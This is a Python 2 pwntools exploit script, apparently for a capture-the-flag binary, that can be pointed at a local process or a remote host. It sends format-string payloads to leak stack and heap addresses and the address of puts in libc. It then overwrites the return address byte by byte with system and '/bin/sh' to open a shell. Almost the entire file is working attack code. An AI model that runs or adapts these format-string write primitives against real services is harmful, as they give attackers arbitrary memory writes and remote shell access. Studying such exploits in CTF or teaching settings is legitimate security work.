#!/usr/bin/env python2

from pwn import *
from qpwn import *
from sys import argv
context(binary='./pwn', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote(argv[1], int(argv[2]))
    libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    libc = ELF('./libc-2.27.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

passed = 0

def write_addr(addr, value, tot, index):
    global passed
    addr_ls = [addr, addr + 1, addr + 2, addr + 3, addr + 4, addr + 5]
    value_ls = [value & 0xff, (value >> 8) & 0xff, (value >> 16) & 0xff,
                (value >> 24) & 0xff, (value >> 32) & 0xff, (value >> 40) & 0xff]
    payload = ''
    passed &= 0xff
    for i in range(tot):
        now = (value_ls[i] - passed + 0x100) & 0xff
        if now == 0:
            now = 0x100
        payload += '%{}c%{}$hhn'.format(now, index + i)
        passed = value_ls[i]
    return payload

index1 = 6
index2 = 14
index3 = 26

def change_tar(target_addr):
    value_ls = map(ord, p32(target_addr))
    low_byte = stack_addr & 0xff
    for i in range(4):
        payload = '%{}c%{}$hhn\n\x00'.format(low_byte + i, index1)
        p.s(payload)
        p.rl()
        payload = '%{}c%{}$hhn\n\x00'.format(value_ls[i], index2)
        p.s(payload)
        p.rl()

def read_addr(target_addr):
    value_ls = map(ord, p32(target_addr))
    low_byte = stack_addr & 0xff
    for i in range(4):
        payload = '%{}c%{}$hhn\n\x00'.format(low_byte + i, index1)
        p.s(payload)
        p.rl()
        payload = '%{}c%{}$hhn\n\x00'.format(value_ls[i], index2)
        p.s(payload)
        p.rl()
    success('target ' + hex(target_addr))
    payload = '%26$p\n\x00'
    p.s(payload)
    p.rl()
    payload = '%26$s\n\x00'
    p.s(payload)

def write_addr(target_addr, value):
    target_ls = [target_addr + i for i in range(4)]
    value_ls = map(ord, p32(value))
    for i in range(4):
        change_tar(target_ls[i])
        success('value [{}]: {}'.format(i, hex(value_ls[i])))
        payload = '%{}c%{}$hhn\n\x00'.format(value_ls[i], index3)
        p.s(payload)
        p.rl()

if __name__ == '__main__':
    p.ru('=\n')

    '''
    payload = '.%6$s.'
    p.sl(payload)
    p.rl()
    gogogo()
    p.i()
    '''

    payload = '.%14$p.%18$p.\x00'
    p.sl(payload)
    p.ru('.')
    stack_addr = int(p.ru('.', drop=True), 16)
    heap_addr = int(p.ru('.', drop=True), 16)
    success('stack ' + hex(stack_addr))
    success('heap ' + hex(heap_addr))
    read_addr(elf.got['puts'])
    puts_addr = u32(p.r(4))
    success('puts '+hex(puts_addr))
    libc.address = puts_addr - libc.sym['puts']
    success('libc'+hex(libc.address))
    ret_addr = stack_addr - 0xffffce38 + 0xffffcdec
#bc(0x0804889F)
    success('ret ' + hex(ret_addr))
    target = [libc.sym['system'], 0xdeadbeef, libc.search('/bin/sh').next()]
    for i in range(len(target)):
        write_addr(ret_addr + i * 4, target[i])
    bc(0x080488AC)
    p.s('quit')
#gogogo('x /20dx %s' % hex(heap_addr - 0x20))
    p.i()
